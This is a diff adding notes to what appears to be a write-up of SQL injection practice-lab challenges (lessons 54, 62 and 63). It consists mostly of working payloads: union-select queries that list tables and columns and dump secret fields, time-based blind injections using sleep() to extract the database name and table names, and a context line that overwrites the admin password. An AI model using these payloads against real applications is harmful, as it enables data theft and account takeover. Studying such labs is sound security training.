@@ -137,6 +137,40 @@ The source code is:
 
 UPDATE users SET PASSWORD='1234' where username='admin'#' and password='$curr_pass'+
 
+```
+
+### Lesson 54 union select challenges
+```
+Try ?id=1
+Try ?id=1' or 1=1--+. It works!
+
+?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
+
+?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="UU9VOJLJIB"),3--+.
+
+
+?id=0' union select 1, (select group_concat(id,0x5c,sessid,0x5c,secret_1V9E,0x5c,tryy) from XKR10CYFA3 limit 0,1),3--+
+
+
+
+```
+
+### Lesson 62 Blind Base challenges
+
+```
+?id=1') and If(ascii(substr(database(),1,1))=116,0,sleep(5))--+
+?id=1') and If(substr(database(),1,8)='security',0,sleep(5))--+
+?id=1') or if ((select substr((select version()),1,1))=5,sleep(2),null)--+
+
+
+For 63
+
+?id=1' and if(substr((select char_length(concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c))),1,1)='1', sleep(3),null)--+
+
+
+?id=1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)>'o', sleep(3),null)--
+
+?id=1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1)>'m', sleep(3),null)--+
 
 
 ```
